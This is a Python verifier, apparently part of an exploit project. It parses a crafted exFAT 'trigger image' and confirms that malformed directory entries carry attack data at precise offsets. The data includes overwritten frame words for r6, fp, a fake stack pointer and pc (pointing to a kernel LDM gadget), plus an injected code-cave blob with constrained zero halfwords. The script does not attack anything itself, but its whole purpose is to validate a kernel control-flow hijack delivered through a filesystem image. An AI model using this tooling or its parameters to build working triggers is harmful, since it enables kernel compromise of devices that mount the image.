#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-only
# Kant-M2 adaptation; see docs/PROVENANCE.md.
"""Independently verify a built Kant trigger image.

Parses the exFAT boot sector and root-directory FAT chain from first
principles (no import of mk_trigger.py), finds the crafted file set
(0x85 -> 0xC0 -> N x 0xC1), reconstructs the 30-byte-per-entry name stream,
and checks the four frame words and the injected cave blob.

This proves the on-disk image carries the intended bytes at the intended
stream offsets. It does not prove the kernel will execute them.
"""
import argparse
import struct
import sys

CAVE = 0xC0008400
DEST = CAVE - 40
STORE_FRAME = CAVE + 40
FAKE_SP = CAVE + 0xA00
LDM_IP = 0xC04DDE3C
INJECT_OFF = 1420


def u16(b, o):
    return struct.unpack_from("<H", b, o)[0]


def u32(b, o):
    return struct.unpack_from("<I", b, o)[0]


def u64(b, o):
    return struct.unpack_from("<Q", b, o)[0]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("image")
    ap.add_argument("--cave-blob")
    ap.add_argument("--expect-num-ext", type=int)
    a = ap.parse_args()

    img = open(a.image, "rb").read()
    if len(img) < 512:
        raise SystemExit("image too small")
    if img[3:11] != b"EXFAT   ":
        raise SystemExit(f"bad exFAT magic: {img[3:11]!r}")
    if u16(img, 510) != 0xAA55:
        raise SystemExit("missing 0xAA55 boot signature")

    bps = 1 << img[108]
    spc = 1 << img[109]
    fat_off = u32(img, 80) * bps
    heap_off = u32(img, 88) * bps
    root_clu = u32(img, 96)
    clu_bytes = bps * spc
    print(f"bps={bps} spc={spc} fat_off={fat_off:#x} heap_off={heap_off:#x} "
          f"root_clu={root_clu} cluster_bytes={clu_bytes}")

    def cluster_file_offset(clu):
        return heap_off + (clu - 2) * clu_bytes

    def fat_next(clu):
        return u32(img, fat_off + clu * 4) & 0x0FFFFFFF

    chain = [root_clu]
    seen = set(chain)
    while True:
        nxt = fat_next(chain[-1])
        if nxt >= 0x0FFFFFF8:
            break
        if nxt in seen or len(chain) > 4096:
            raise SystemExit(f"bad FAT chain at cluster {nxt}")
        seen.add(nxt)
        chain.append(nxt)
    root = b"".join(img[cluster_file_offset(c):cluster_file_offset(c) + clu_bytes]
                    for c in chain)
    print(f"root chain: {chain} ({len(root)} bytes)")

    # Find a 0x85 entry whose secondary count matches a following 0xC0 and
    # 0xC1 entries (avoids false positives inside payload bytes).
    found = None
    for off in range(0, len(root) - 32 * 3, 32):
        if root[off] != 0x85:
            continue
        num_ext = root[off + 1]
        if not (3 <= num_ext < 255):
            continue
        base = off + 32
        if base >= len(root) or root[base] != 0xC0:
            continue
        n_entries = num_ext - 1
        if base + 32 * n_entries > len(root):
            continue
        if any(root[base + 32 * k] != 0xC1 for k in range(1, n_entries + 1)):
            continue
        found = (off, num_ext, base)
        break
    if not found:
        raise SystemExit("crafted 0x85/0xC0/0xC1 file set not found")

    off, num_ext, base = found
    stream = b"".join(root[base + 32 * k + 2: base + 32 * k + 32]
                      for k in range(1, num_ext))
    print(f"file set at root+{off:#x}: num_ext={num_ext} "
          f"entries={num_ext-1} stream={len(stream)} bytes")
    if a.expect_num_ext is not None and num_ext != a.expect_num_ext:
        raise SystemExit(f"num_ext {num_ext} != expected {a.expect_num_ext}")
    if num_ext >= 255:
        raise SystemExit("num_ext 255 is the unusable u8-wrap value")

    checks = [
        ("r6  @528", 528, DEST),
        ("fp  @548", 548, STORE_FRAME),
        ("sp  @552", 552, FAKE_SP),
        ("pc  @556", 556, LDM_IP),
    ]
    ok = True
    for name, off_b, want in checks:
        got = u32(stream, off_b)
        status = "OK" if got == want else "MISMATCH"
        if got != want:
            ok = False
        print(f"  {name}: got {got:#010x} want {want:#010x} [{status}]")

    if a.cave_blob:
        blob = open(a.cave_blob, "rb").read()
        if INJECT_OFF + len(blob) > len(stream):
            raise SystemExit("cave blob exceeds stream")
        got = stream[INJECT_OFF:INJECT_OFF + len(blob)]
        status = "OK" if got == blob else "MISMATCH"
        if got != blob:
            ok = False
        print(f"  cave blob @{INJECT_OFF}: {len(blob)} bytes [{status}]")
        # The only zero halfword must be at blob offset 10 (copy_len high half).
        zeros = [i for i in range(0, len(blob), 2)
                 if struct.unpack_from("<H", blob, i)[0] == 0]
        bad = [z for z in zeros if z != 10]
        print(f"  blob zero halfwords: {[hex(z) for z in zeros]} "
              f"(allowed only 0xa) [{'OK' if not bad else 'BAD'}]")
        if bad:
            ok = False

    print("RESULT:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
